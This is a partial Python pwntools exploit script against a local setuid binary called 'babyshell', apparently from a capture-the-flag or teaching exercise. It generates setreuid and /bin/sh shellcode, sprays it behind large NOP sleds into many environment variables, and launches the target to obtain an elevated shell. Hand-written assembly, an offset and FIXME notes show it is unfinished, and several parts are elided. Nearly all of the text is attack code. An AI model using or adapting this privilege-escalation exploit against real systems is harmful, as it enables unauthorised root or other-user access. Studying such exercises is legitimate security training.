...
shellcode = asm( shellcraft.setreuid(1010) + shellcraft.sh() )
nop_sled = b'\x90'*0x15000
egg = nop_sled + shellcode

envlist = {}
for i in range(15):
    envlist['EGG'+str(i)] = egg
...
if DEBUG:
    try:
        os.remove("./babyshell_copy")
    except OSError:
        pass
    shutil.copyfile("babyshell", "babyshell_copy")
    st = os.stat('babyshell_copy')
    os.chmod('babyshell_copy', st.st_mode|stat.S_IEXEC)

    io = process("./babyshell_copy",env=envlist)
else:
    io = process('./babyshell', env=envlist)

# Setting environment variable NOP sleds
#byteStr = b'\x90'*0x200
#os.environb[b'EXPLOIT_ENV_VAR'] = byteStr


#read the output of shellme, up to the string "at: "
io.recvuntil(b'le\n')

#we finish reading the line from shellme, and we extract the location of the buffer
#stackaddr = io.readline().rstrip()
#we are going to place the shellcode at the beginning of the buffer
#so the beginning of the buffer is our "target" address
#target_addr = int(b'\x00\x00\xc0\xff', 8)
#print("the target address is: ",hex(target_addr))

#the following shellcode is not very optimized
get_shell = '''
        mov ecx, 1007 #FIXME Change 1007 to the effective user id of shellme
        mov edi, ecx
        mov esi, ecx
        mov rax, 113
...
offset = 140 #FIXME it should not be 150
